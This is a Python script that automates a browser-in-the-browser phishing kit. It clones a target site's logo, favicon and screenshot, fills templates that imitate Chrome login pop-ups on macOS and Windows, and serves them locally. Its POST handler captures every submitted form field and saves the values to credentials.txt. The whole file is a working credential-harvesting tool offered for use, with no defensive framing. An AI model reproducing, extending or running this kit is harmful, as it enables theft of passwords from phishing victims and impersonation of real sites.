import requests
import argparse
import socketserver
import http.server
import logging
import cgi

parser = argparse.ArgumentParser(prog='PROG', conflict_handler='resolve')

parser.add_argument(
    '-u',
    '--url',
    default = 'http://reddit.com',
    help='the url to clone'
)

parser.add_argument(
    '-t',
    '--title',
    default = 'Sign in to your account now',
    help='The title that shows up for the page (e.g. Sign in to your account now)'
)


parser.add_argument(
    '-h',
    '--host',
    default = '127.0.0.1',
    help='host ip'
)

parser.add_argument(
    '-p',
    '--port',
    default = 8000,
    help='host port'
)

parser.print_help()

args=(parser.parse_args())

PORT = int(args.port)
HOST = args.host
TITLE = args.title
PHISHING_LINK = '/BITB/phish/index.html'


def urlSplit(url):
    '''uses regex to split the url and return domain'''
    import re
    m = re.split("https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)", url)
    domain = (m[2])
    return domain


class createTarget:
    def __init__(self, url):
        self.url = url
        global DOMAIN_NAME
        DOMAIN_NAME = url
        global DOMAIN_PATH
        DOMAIN_PATH = f'/auth/{urlSplit(url)}/login'

    def fetchLogo(self):
        imageurl = f'https://logo.clearbit.com/{self.url}'
        img_data = requests.get(imageurl).content
        with open(f'BITB/logos/logo.jpg', 'wb') as handler:
            handler.write(img_data)

    def getFavicom(self):
        '''visits target website and captures favicon'''
        # sometimes this favicon.ico standard is not followed, perhaps if not found search html for .ico file and use instead?
        favUrl = f'{self.url}/favicon.ico'
        img_data = requests.get(favUrl).content
        with open('logo.jpg', 'wb') as handler:
            handler.write(img_data)

    def createScreenshot(self):
        '''creates a page screenshot of target website'''
        # this needs to be the correct resolution... How to find targets native resolution? perhaps capture in several aspect ratio, use js to detect?
        from selenium import webdriver
        driver = webdriver.Chrome()
        url = self.url
        driver.get(url)
        driver.save_screenshot('ss.png')

    def stage(self):
        '''changes the placeholders inside the temp html files and moves to staging folder'''
        folders = 'MacOS-Chrome-DarkMode', \
                  'MacOS-Chrome-LightMode', \
                  'Windows-Chrome-DarkMode', \
                  'Windows-Chrome-LightMode', \
                  'Windows-DarkMode-Delay'
        for folder in folders:
            tempIndex = f'BITB/Temp/{folder}/index.html'
            stagedIndex = f'BITB/Staged/{folder}/index.html'
            f = open(tempIndex, "r")
            html = f.read()
            f.close()
            html = html.replace("XX-TITLE-XX", TITLE)
            html = html.replace("XX-DOMAIN-NAME-XX", DOMAIN_NAME)
            html = html.replace("XX-DOMAIN-PATH-XX", DOMAIN_PATH)
            html = html.replace("XX-PHISHING-LINK-XX", PHISHING_LINK)
            f = open(stagedIndex, "w")
            f.write(html)
            f.close()

class ServerHandler(http.server.SimpleHTTPRequestHandler):

    def do_GET(self):
        logging.error(self.headers)
        http.server.SimpleHTTPRequestHandler.do_GET(self)

    def do_POST(self):
        logging.error(self.headers)
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        for item in form.list:
            logging.error(item)
        http.server.SimpleHTTPRequestHandler.do_GET(self)

        with open("credentials.txt", "w") as file:
            for key in form.keys():
                file.write(str(form.getvalue(str(key))) + ",")





target = createTarget(args.url)
target.getFavicom()
target.fetchLogo()
target.createScreenshot()
target.stage()

Handler = ServerHandler
httpd = socketserver.TCPServer((HOST, PORT), Handler)
print(F"serving at http://{HOST}:{PORT}/BITB/Staged/")
httpd.serve_forever()
